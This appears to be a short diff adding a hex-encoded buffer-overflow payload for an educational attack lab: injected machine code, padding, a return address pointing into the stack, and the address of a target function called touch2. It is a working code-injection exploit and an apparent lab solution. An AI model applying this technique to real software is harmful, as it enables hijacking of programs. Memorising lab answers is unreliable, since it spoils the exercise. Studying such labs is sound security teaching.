@@ -1,0 +1,6 @@
+48 c7 c7 45 ff 1e 3c c3 // injected code 
+00 00 00 00 00 00 00 00 // buffer
+00 00 00 00 00 00 00 00 // buffer
+d8 99 66 55 00 00 00 00 // address of injected code
+d8 99 66 55 00 00 00 00 // repeat for alignment
+2e 15 40 00 00 00 00 00 // touch2's address
